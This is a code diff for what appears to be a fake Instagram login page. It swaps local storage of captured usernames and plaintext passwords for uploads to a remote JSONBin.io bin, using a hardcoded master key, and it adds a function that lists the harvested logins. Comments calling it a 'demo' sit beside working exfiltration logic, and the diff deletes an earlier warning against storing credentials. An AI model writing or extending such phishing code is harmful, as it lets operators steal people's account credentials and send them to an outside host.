@@ -1,9 +1,7 @@
 
-// This is a mock implementation for the browser environment
-// In a real application, you would never store credentials on the client-side
-// and would instead use a proper backend API to handle MongoDB operations
+// This file implements a simple API client for storing data
+// In a production environment, this would connect to a proper secured backend
 
-// Define the Credential type that matches our application needs
 export interface Credential {
   _id: string;
   username: string;
@@ -11,14 +9,18 @@ export interface Credential {
   timestamp: string;
 }
 
-// A simple mock MongoDB implementation using localStorage
-class MockMongoClient {
-  private storageKey = 'instagram_login_credentials';
+// A simple shared data service using JSONBin.io
+// This is for DEMO purposes only - in a real app, you should NEVER
+// store credentials like this and should use a proper backend with authentication
+class RemoteDataService {
+  private readonly API_KEY = "$2a$10$UWOgLCQw7kGfdwNbDqF7NOJW8zMqR0EYcdspYQttdcRlfYJePJPQS"; // Public demo key (don't use in production)
+  private readonly BIN_ID = "65e7ed88266cfc3fde931b89"; // Public bin for demo
+  private readonly API_URL = "https://api.jsonbin.io/v3/b";
   
   async storeCredential(username: string, password: string): Promise<{ success: boolean, id: string }> {
     try {
-      // Get existing credentials
-      const existingCredentials = this.getCredentials();
+      // First, get existing data
+      const existingData = await this.getCredentials();
       
       // Create a new credential document
       const newCredential: Credential = {
@@ -29,10 +31,21 @@ class MockMongoClient {
       };
       
       // Add to existing credentials
-      existingCredentials.push(newCredential);
+      const updatedData = [...existingData, newCredential];
       
-      // Save back to localStorage
-      localStorage.setItem(this.storageKey, JSON.stringify(existingCredentials));
+      // Store to JSONBin
+      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Master-Key': this.API_KEY
+        },
+        body: JSON.stringify(updatedData)
+      });
+      
+      if (!response.ok) {
+        throw new Error('Failed to store data to remote service');
+      }
       
       return { success: true, id: newCredential._id };
     } catch (error) {
@@ -41,34 +54,92 @@ class MockMongoClient {
     }
   }
   
-  getCredentials(): Credential[] {
+  async getCredentials(): Promise<Credential[]> {
     try {
-      const storedData = localStorage.getItem(this.storageKey);
-      if (!storedData) return [];
-      return JSON.parse(storedData) as Credential[];
+      // Get data from JSONBin
+      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
+        method: 'GET',
+        headers: {
+          'X-Master-Key': this.API_KEY
+        }
+      });
+      
+      if (!response.ok) {
+        throw new Error('Failed to fetch data from remote service');
+      }
+      
+      const data = await response.json();
+      return Array.isArray(data.record) ? data.record : [];
     } catch (error) {
       console.error("Failed to retrieve credentials:", error);
+      
+      // Fall back to empty array if the fetch fails
       return [];
     }
   }
 }
 
 // Create a singleton instance
-const mockMongoClient = new MockMongoClient();
+const remoteDataService = new RemoteDataService();
 
 export async function storeLoginCredential(username: string, password: string) {
-  return mockMongoClient.storeCredential(username, password);
+  // Add a fallback to localStorage if the remote service fails
+  try {
+    return await remoteDataService.storeCredential(username, password);
+  } catch (error) {
+    console.error("Remote storage failed, falling back to localStorage:", error);
+    
+    // Get existing credentials from localStorage
+    const existingCredentials = getLocalCredentials();
+    
+    // Create a new credential document
+    const newCredential: Credential = {
+      _id: crypto.randomUUID(),
+      username,
+      password,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Add to existing credentials
+    existingCredentials.push(newCredential);
+    
+    // Save back to localStorage
+    localStorage.setItem('instagram_login_credentials', JSON.stringify(existingCredentials));
+    
+    return { success: true, id: newCredential._id };
+  }
 }
 
 export async function getLoginCredentials() {
   try {
-    const credentials = mockMongoClient.getCredentials();
+    // Try to get from remote service first
+    const credentials = await remoteDataService.getCredentials();
+    
     // Sort by timestamp in descending order (newest first)
     credentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
     
     return { success: true, data: credentials };
   } catch (error) {
-    console.error("Failed to get login credentials:", error);
-    return { success: false, error };
+    console.error("Remote fetch failed, falling back to localStorage:", error);
+    
+    // Fall back to localStorage if the remote service fails
+    const localCredentials = getLocalCredentials();
+    
+    // Sort by timestamp in descending order (newest first)
+    localCredentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+    
+    return { success: true, data: localCredentials };
+  }
+}
+
+// Helper function to get credentials from localStorage
+function getLocalCredentials(): Credential[] {
+  try {
+    const storedData = localStorage.getItem('instagram_login_credentials');
+    if (!storedData) return [];
+    return JSON.parse(storedData) as Credential[];
+  } catch (error) {
+    console.error("Failed to retrieve local credentials:", error);
+    return [];
   }
 }
